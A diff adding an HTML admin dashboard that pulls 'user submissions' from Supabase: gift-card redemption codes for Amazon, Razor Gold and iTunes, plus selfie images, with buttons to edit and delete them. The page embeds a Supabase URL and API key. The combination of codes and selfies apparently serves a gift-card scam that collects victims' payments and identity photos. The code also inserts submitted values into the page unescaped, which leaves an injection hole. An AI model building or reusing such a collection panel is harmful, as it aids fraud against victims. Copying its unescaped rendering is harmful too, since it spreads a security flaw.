@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard - Submissions</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <style>
+    *{box-sizing:border-box;}
+    body{margin:0;font-family:'Segoe UI',sans-serif;display:flex;height:100vh;background:#f4f6f9;color:#333;}
+    .sidebar{width:220px;background:#2d3436;color:white;padding:20px;display:flex;flex-direction:column;}
+    .sidebar h2{margin-bottom:30px;text-align:center;}
+    .sidebar a{color:white;text-decoration:none;margin:10px 0;padding:10px;border-radius:6px;display:block;}
+    .sidebar a:hover{background:#636e72;}
+    .main{flex:1;padding:20px;overflow-y:auto;}
+    h1{margin-top:0;}
+    table{width:100%;border-collapse:collapse;margin-top:20px;background:white;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
+    th,td{padding:12px;border-bottom:1px solid #ddd;text-align:left;}
+    th{background:#0044cc;color:white;}
+    tr:hover{background:#f1f1f1;}
+    img{max-width:100px;border-radius:6px;}
+    .btn{padding:6px 12px;border:none;border-radius:6px;cursor:pointer;font-size:14px;}
+    .btn-edit{background:#00b894;color:white;}
+    .btn-delete{background:#d63031;color:white;}
+    .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);justify-content:center;align-items:center;}
+    .modal-content{background:white;padding:20px;border-radius:12px;width:95%;max-width:400px;}
+    .modal-content input,.modal-content select{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:8px;}
+    .modal-content button{margin-top:10px;}
+    @media(max-width:768px){.sidebar{display:none;}.main{padding:10px;}}
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <h2>⚡ Admin</h2>
+    <a href="#">📋 Submissions</a>
+    <a href="#">⚙ Settings</a>
+  </div>
+  <div class="main">
+    <h1>📋 Submissions Dashboard</h1>
+    <p>Manage user submissions stored in Supabase.</p>
+    <table id="submissionsTable">
+      <thead>
+        <tr>
+          <th>Time</th>
+          <th>Code</th>
+          <th>Card</th>
+          <th>Selfie</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="submissionsBody">
+        <tr><td colspan="5">Loading...</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Edit Modal -->
+  <div class="modal" id="editModal">
+    <div class="modal-content">
+      <h2>Edit Submission</h2>
+      <input type="hidden" id="editId">
+      <label>Redemption Code</label>
+      <input type="text" id="editCode">
+      <label>Card Type</label>
+      <select id="editCard">
+        <option value="amazon">Amazon</option>
+        <option value="razor">Razor Gold</option>
+        <option value="itunes">iTunes</option>
+      </select>
+      <button class="btn btn-edit" onclick="updateSubmission()">Save Changes</button>
+      <button class="btn" onclick="closeEditModal()">Cancel</button>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL="https://axhatyuncfimmygtpunf.supabase.co";
+    const SUPABASE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF4aGF0eXVuY2ZpbW15Z3RwdW5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3NzQ3MjUsImV4cCI6MjA3MTM1MDcyNX0.t5HuwXZAt8hViSPraOOBfv-BFC73xmw4Z7hqGA7CvuA"; // ⚠️ Replace with anon key
+    const { createClient }=supabase;
+    const client=createClient(SUPABASE_URL,SUPABASE_KEY);
+
+    const tableBody=document.getElementById("submissionsBody");
+
+    async function loadSubmissions(){
+      const { data,error }=await client.from("user_submissions").select("*").order("created_at",{ascending:false});
+      if(error){tableBody.innerHTML=`<tr><td colspan="5" style="color:red;">Error: ${error.message}</td></tr>`;return;}
+      if(!data||data.length===0){tableBody.innerHTML=`<tr><td colspan="5">No submissions yet.</td></tr>`;return;}
+      tableBody.innerHTML=data.map(sub=>`
+        <tr>
+          <td>${new Date(sub.created_at).toLocaleString()}</td>
+          <td>${sub.redemption_code||'N/A'}</td>
+          <td>${sub.card_types?.join(", ")||'N/A'}</td>
+          <td>${sub.selfie_url?`<img src="${sub.selfie_url}">`:"No image"}</td>
+          <td>
+            <button class="btn btn-edit" onclick="openEditModal('${sub.id}','${sub.redemption_code||''}','${sub.card_types?sub.card_types[0]:''}')">Edit</button>
+            <button class="btn btn-delete" onclick="deleteSubmission('${sub.id}')">Delete</button>
+          </td>
+        </tr>
+      `).join("");
+    }
+
+    async function deleteSubmission(id){
+      if(!confirm("Are you sure you want to delete this entry?")) return;
+      const { error }=await client.from("user_submissions").delete().eq("id",id);
+      if(error){alert("Error deleting: "+error.message);return;}
+      loadSubmissions();
+    }
+
+    function openEditModal(id,code,card){
+      document.getElementById("editId").value=id;
+      document.getElementById("editCode").value=code;
+      document.getElementById("editCard").value=card;
+      document.getElementById("editModal").style.display="flex";
+    }
+
+    function closeEditModal(){document.getElementById("editModal").style.display="none";}
+
+    async function updateSubmission(){
+      const id=document.getElementById("editId").value;
+      const code=document.getElementById("editCode").value.trim();
+      const card=document.getElementById("editCard").value;
+      const { error }=await client.from("user_submissions").update({
+        redemption_code: code,
+        card_types:[card]
+      }).eq("id",id);
+      if(error){alert("Error updating: "+error.message);return;}
+      closeEditModal();
+      loadSubmissions();
+    }
+
+    // Initial load
+    loadSubmissions();
+  </script>
+</body>
+</html>
